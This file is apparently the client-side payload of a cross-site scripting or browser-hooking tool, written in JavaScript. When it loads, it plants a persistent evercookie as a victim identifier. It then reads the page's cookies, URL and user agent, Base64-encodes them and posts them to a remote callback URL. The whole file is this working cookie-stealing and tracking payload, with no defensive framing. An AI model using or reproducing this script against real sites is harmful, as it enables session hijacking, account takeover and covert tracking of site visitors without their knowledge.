function makeclientid(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
       result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
 }
function sendDataBack(data)
{
    url=this.jscallback
    data={'dataupload':data}
    data['clientbasicinfo']={}
    data['clientbasicinfo']['jsurl']=this.jsurl
    data['clientbasicinfo']['clientid']=this.clientid

    data=Base64.encode(JSON.stringify(data))
    var retval='shit'
    $.ajax({
        type: "post",
        url: url,
        async: false, 
        data: {'content':data},
        contentType: "application/x-www-form-urlencoded; charset=utf-8",
        success: function(data) {
            retval=data
        } 
    });
    return retval
}

this.ec = new evercookie(); 
function setevercookie(name,value)
{
    this.ec.evercookie_cookie(name, value)
    this.ec.evercookie_userdata(name, value)
    this.ec.evercookie_window(name, value)
}
function getevercookie(name)
{
    value=undefined
    return this.ec.evercookie_cookie(name, value) || this.ec.evercookie_userdata(name, value) || this.ec.evercookie_window(name, value)
}

function main()
{
    cookie=getevercookie('steakcookie')
    if(cookie==undefined)
    {
        this.clientid=makeclientid(15);
        curdomaincookies=document.cookie
        cururl=location.href
        useragent=navigator.userAgent
        data={'curdomaincookies':document.cookie,'cururl':cururl,'useragent':useragent}
        sendDataBack(data)
    }
    else
        this.clientid=cookie
    //alert('clientid:'+this.clientid)
}

main()